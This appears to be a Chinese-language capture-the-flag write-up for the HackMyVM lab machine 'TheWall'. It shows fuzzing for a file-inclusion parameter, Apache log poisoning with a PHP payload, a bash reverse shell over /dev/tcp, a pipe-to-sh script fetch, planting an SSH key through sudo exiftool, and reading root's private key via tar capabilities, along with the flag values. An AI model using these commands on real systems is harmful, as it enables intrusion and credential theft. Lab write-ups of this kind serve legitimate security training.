# TheWall

2025.02.14 https://hackmyvm.eu/machines/machine.php?vm=TheWall

[video](https://www.bilibili.com/video/BV1qXKLe5Eu1/?vd_source=aed2f374c732513d2e535afafb1fd2ec)

## Ip

192.168.5.38

## Scan

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

80 web 首页没什么信息，gobuster 后出现大量 403，可能存在 WAF，必须降低请求速率，防止出现 403，先用一个小字典进行扫描，有点慢需要等待：

```
gobuster dir -t 10 -k -w ~/tools/dict/fileName5000.txt -u http://192.168.5.38/ -e -x php --delay 3000ms
```

扫描出一个空白 php 文件：http://192.168.5.38/includes.php 看文件名像是有文件包含，需要爆破一下可能存在的参数，也是很慢：

```
ffuf -t 2 -ac -c -rate 10 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://192.168.5.38/includes.php?FUZZ=/etc/passwd
```

找到隐藏参数为 display_page:

```
curl http://192.168.5.38/includes.php?display_page=/etc/passwd
```

可以读取到 /etc/passwd 文件，在探测一下看看能读取到哪些系统文件：

```
ffuf -t 2 -ac -c -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt -u http://192.168.5.38/includes.php?display_page=FUZZ -fs 0
```

最终发现可以读取到 apache 的日志文件，这时可以实现注入 php 代码，然后获得反弹的 shell:

```
curl 'http://192.168.5.38/includes.php?display_page=/var/log/apache2/access.log'
```

kali 上监听 8888 端口，然后注入 php 代码：

```
curl -A '<?php echo 456; system($_GET[1]);?>' http://192.168.5.38/index.php
curl -G --data-urlencode 'display_page=/var/log/apache2/access.log' --data-urlencode '1=/bin/bash -c "/bin/bash -i >& /dev/tcp/192.168.5.3/8888 0>&1"' http://192.168.5.38/includes.php
```

这时得到了反弹的链接，直接得到了 user flag:

```
www-data@TheWall:/home/john$ cat user.txt
cc5db5e7b0a26e807765f47a006f6221
```

sudo -l 发现 (john : john) NOPASSWD: /usr/bin/exiftool 可以使用这个 exiftoo 将私钥信息植入到 home/john/.ssh 中:

```
cd /tmp
ssh-keygen -t rsa -f ./id_rsa
sudo -u john exiftool -filename=/home/john/.ssh/authorized_keys ./id_rsa.pub
ssh -i id_rsa john@127.0.0.1
```

由于目标上没有 curl、wget、nc 等，使用下面的方法执行 peas：

```
kali上执行：
nc -q 3 -lvnp 8888 < ~/tools/scripts/lin/enum/peas.sh

目标机器上执行：
bash -c 'cat < /dev/tcp/192.168.5.3/8888 | sh'
```

发现 capabilities: /usr/sbin/tar cap_dac_read_search=ep 可以读取敏感文件，发现 / 中有 id_rsa 可能是 root 用户的，尝试读取：

```
/usr/sbin/tar -vcf /tmp/rsa.tar /id_rsa
cd /tmp
tar -xvf rsa.tar
ssh -i id_rsa root@127.0.0.1
```

登陆成功，得到了 root flag：

```
root@TheWall:~# cat r0Ot.txT
4be82a3be9aed6eea5d0cce68e17662e
```
